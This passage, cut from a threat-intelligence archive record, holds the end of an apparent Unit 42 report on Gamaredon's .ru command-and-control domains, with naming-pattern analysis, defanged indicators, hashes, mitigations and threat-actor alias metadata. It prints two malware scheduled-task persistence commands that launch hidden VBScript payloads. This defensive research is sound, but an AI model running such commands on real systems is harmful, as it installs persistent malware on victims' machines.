8/5/2021\n\nlangosta[.]ru 6/25/2021\n\nmalgaloda[.]ru 6/8/2021\n\n_Table 8. Cluster 3 domains._\n\nWe again observe domain reputation aging, as seen in cluster 2.\n\nAn interesting naming pattern is seen in cluster 3 – also seen in some cluster 1 host and subdomain names. We see these actors using\nEnglish words, seemingly grouped by the first two or three letters. For example:\n\ndeep-rooted.gloritapa[.]ru\n\ndeep-sinking.gloritapa[.]ru\n\ndeepwaterman.gloritapa[.]ru\n\ndeepnesses.gloritapa[.]ru\n\ndeep-lunged.gloritapa[.]ru\n\ndeerfood.gortomalo[.]ru\nd b k t l [ ]\n\n\n-----\n\ndespite.gortisir[.]ru\ndes.gortisir[.]ru\ndesire.gortisir[.]ru\n\nThis pattern differs from those of cluster 2, but has been observed on some cluster 1 (dropper) domains, for example:\n\nalley81.salts.kolorato[.]ru\nallied.striman[.]ru\nallowance.hazari[.]ru\nallowance.telefar[.]ru\nally.midiatr[.]ru\nallocate54.previously.bilorotka[.]ru\nalluded6.perfect.bilorotka[.]ru\nalready67.perfection.zanulor[.]ru\nalready8.perfection.zanulor[.]ru\n\nThis pattern is even carried into HTTP POSTs, files and directories created by associated samples:\n\nExample 1:\n\nSHA256: 74cb6c1c644972298471bff286c310e48f6b35c88b5908dbddfa163c85debdee\n\ndeerflys.gortomalo[.]ru\n\nC:\\Windows\\System32\\schtasks.exe /CREATE /sc minute /mo 11 /tn \"deepmost\" /tr \"wscript.exe \"C:\\Users\\Public\\\\deepnaked\\deepmost.fly\" counteract /create //b /criminal //e:VBScript /cracker counteract \" /F\n\nPOST /index.eef/deep-water613\n\nExample 2:\n\nSHA256: ffb6d57d789d418ff1beb56111cc167276402a0059872236fa4d46bdfe1c0a13\n\ndeer-neck.gortomalo[.]ru\n\n\"C:\\Windows\\System32\\schtasks.exe\" /CREATE /sc minute /mo 13 /tn \"deep-worn\" /tr \"wscript.exe \"C:\\Users\\Public\\\\deerberry\\deepworn.tmp\" crumb /cupboard //b /cripple //e:VBScript /curse crumb \" /F\n\nPOST /cache.jar/deerkill523\n\nBecause we only see this with some domains, this may be a technique employed by a small group of actors or teams. It suggests a possible\nlink between the cluster 3 samples and those from cluster 1 employing a similar naming system. In contrast, we do not observe cluster 2’s\nlarge-number or random-string naming technique employed in any cluster 1 domains.\n\n## Conclusion\n\nGamaredon has been targeting Ukrainian victims for almost a decade. As international tensions surrounding Ukraine remain unresolved,\nGamaredon’s operations are likely to continue to focus on Russian interests in the region. This blog serves to highlight the importance of\nresearch into adversary infrastructure and malware, as well as community collaboration, in order to detect and defend against nationstate cyberthreats. While we have mapped out three large clusters of currently active Gamaredon infrastructure, we believe there is more\nthat remains undiscovered. Unit 42 remains vigilant in monitoring the evolving situation in Ukraine and continues to actively hunt for\nindicators to put protections in place to defend our customers anywhere in the world. We encourage all organizations to leverage this\nresearch to hunt for and defend against this threat.\n\n### Protections and Mitigations\n\nThe best defense against this evolving threat group is a security posture that favors prevention. We recommend that organizations\nimplement the following:\n\nSearch network and endpoint logs for any evidence of the indicators of compromise associated with this threat group.\nEnsure cybersecurity solutions are effectively blocking against the active infrastructure IoCs identified above.\nImplement a DNS security solution in order to detect and mitigate DNS requests for known C2 infrastructure.\nApply additional scrutiny to all network traffic communicating with AS 197695 (Reg[.]ru).\n[If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call](http://start.paloaltonetworks.com/contact-unit42.html)\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan:\n+81.50.1790.0200.\n\n\n-----\n\nFor Palo Alto Networks customers, our products and services provide the following coverage associated with this campaign:\n\n[Cortex XDR protects endpoints from the malware techniques described in this blog.](https://www.paloaltonetworks.com/cortex/cortex-xdr)\n\n[WildFire cloud-based threat analysis service accurately identifies the malware described in this blog as malicious.](https://www.paloaltonetworks.com/products/secure-the-network/wildfire)\n\n[Advanced URL Filtering and DNS Security identify all phishing and malware domains associated with this group as malicious.](https://www.paloaltonetworks.com/network-security/advanced-url-filtering)\n\n[Users of AutoFocus contextual threat intelligence service can view malware associated with these attacks using the Gamaredon Group tag.](https://www.paloaltonetworks.com/cortex/autofocus)\n\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance\nmembers. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious\n[cyber actors. Learn more about the Cyber Threat Alliance.](http://www.cyberthreatalliance.org/)\n\n## Indicators of Compromise\n\n[A list of the domains, IP addresses and malware hashes is available on the Unit 42 GitHub.](https://github.com/pan-unit42/iocs/blob/master/Gamaredon/Gamaredon_IoCs_JAN2022.txt) [Additional IoCs shared in a Feb. 16 update to](https://github.com/pan-unit42/iocs/blob/master/Gamaredon/2022_02_Gamaredon_UPDATE.txt)\nthis report are also available.\n\n## Additional Resources\n\n[The Gamaredon Group Toolset Evolution – Unit 42, Palo Alto Networks](https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution/)\n[Threat Brief: Ongoing Russia and Ukraine Cyber Conflict – Unit 42, Palo Alto Networks](https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/)\n[Technical Report on Armageddon / Gamaredon – Security Service of Ukraine](https://ssu.gov.ua/uploads/files/DKIB/%D0%A2%D0%B5%D1%85%D0%BD%D1%96%D1%87%D0%BD%D0%B8%D0%B9%20%D0%B7%D0%B2%D1%96%D1%82%20%D0%B4%D1%96%D1%8F%D0%BB%D1%8C%D0%BD%D0%BE%D1%81%D1%82%D1%96%20%D0%90%D1%80%D0%BC%D0%B0%D0%B3%D0%B5%D0%B4%D0%BE%D0%BD.pdf)\n[Tale of Gamaredon Infection – CERT-EE / Estonian Information System Authority](https://www.ria.ee/sites/default/files/content-editors/kuberturve/tale_of_gamaredon_infection.pdf)\n\n_Updated Feb. 16, 2021, at 6:30 a.m. PT._\n\n**Get updates from Palo Alto Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-03 - Russias Gamaredon aka Primitive Bear APT Group Actively Targeting Ukraine.pdf"
    ],
    "report_names": [
        "2022-02-03 - Russias Gamaredon aka Primitive Bear APT Group Actively Targeting Ukraine.pdf"
    ],
    "threat_actors": [
        {
            "id": "81bd7107-6b2d-45c9-9eea-1843d4b9b308",
            "created_at": "2022-10-25T15:50:23.320841Z",
            "updated_at": "2025-03-27T02:00:55.441723Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Gamaredon Group",
                "IRON TILDEN",
                "Primitive Bear",
                "ACTINIUM",
                "Armageddon",
                "Shuckworm",
                "DEV-0157",
                "Aqua Blizzard"
            ],
            "source_name": "MITRE:Gamaredon Group",
            "tools": [
                "QuietSieve",
                "Pteranodon",
                "PowerPunch"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d5156b55-5d7d-4fb2-836f-861d2e868147",
            "created_at": "2023-01-06T13:46:38.557326Z",
            "updated_at": "2025-03-27T02:00:02.861124Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Aqua Blizzard",
                "Actinium",
                "DEV-0157",
                "Blue Otso",
                "G0047",
                "PRIMITIVE BEAR",
                "Shuckworm",
                "Trident Ursa",
                "UAC-0010",
                "Winterflounder",
                "ACTINIUM",
                "BlueAlpha",
                "IRON TILDEN"
            ],
            "source_name": "MISPGALAXY:Gamaredon Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "61940e18-8f90-4ecc-bc06-416c54bc60f9",
            "created_at": "2022-10-25T16:07:23.659529Z",
            "updated_at": "2025-03-27T02:02:09.912404Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Actinium",
                "Aqua Blizzard",
                "Armageddon",
                "Blue Otso",
                "BlueAlpha",
                "Callisto",
                "DEV-0157",
                "Iron Tilden",
                "Operation STEADY#URSA",
                "Primitive Bear",
                "SectorC08",
                "Shuckworm",
                "Trident Ursa",
                "UAC-0010",
                "Winterflounder"
            ],
            "source_name": "ETDA:Gamaredon Group",
            "tools": [
                "Aversome infector",
                "BoneSpy",
                "DessertDown",
                "DilongTrash",
                "DinoTrain",
                "EvilGnome",
                "FRAUDROP",
                "Gamaredon",
                "GammaDrop",
                "GammaLoad",
                "GammaSteel",
                "Gussdoor",
                "ObfuBerry",
                "ObfuMerry",
                "PlainGnome",
                "PowerPunch",
                "Pteranodon",
                "Pterodo",
                "QuietSieve",
                "Remote Manipulator System",
                "Resetter",
                "RuRAT",
                "SUBTLE-PAWS",
                "UltraVNC"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "236a8303-bf12-4787-b6d0-549b44271a19",
            "created_at": "2024-06-04T02:03:07.966137Z",
            "updated_at": "2025-03-27T02:05:17.410356Z",
            "deleted_at": null,
            "main_name": "IRON TILDEN",
            "aliases": [
                "Aqua Blizzard ",
                "Armageddon",
                "Blue Otso ",
                "BlueAlpha ",
                "Dancing Salome ",
                "Gamaredon",
                "Gamaredon Group",
                "Hive0051 ",
                "Primitive Bear ",
                "Shuckworm ",
                "Trident Ursa ",
                "UAC-0010 ",
                "UNC530 ",
                "WinterFlounder ",
                "ACTINIUM "
            ],
            "source_name": "Secureworks:IRON TILDEN",
            "tools": [
                "Pterodo"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535742,
    "ts_updated_at": 1743041637,
    "ts_creation_date": 1653488871,
    "ts_modification_date": 1653488871,
    "files": {
        "pdf": "https://archive.orkl.eu/feb82f4ef5e80fc1f64c45013f85ede7cc753ebd.pdf",
        "text": "https://archive.orkl.eu/feb82f4ef5e80fc1f64c45013f85ede7cc753ebd.txt",
        "img": "https://archive.orkl.eu/feb82f4ef5e80fc1f64c45013f85ede7cc753ebd.jpg"
    }
}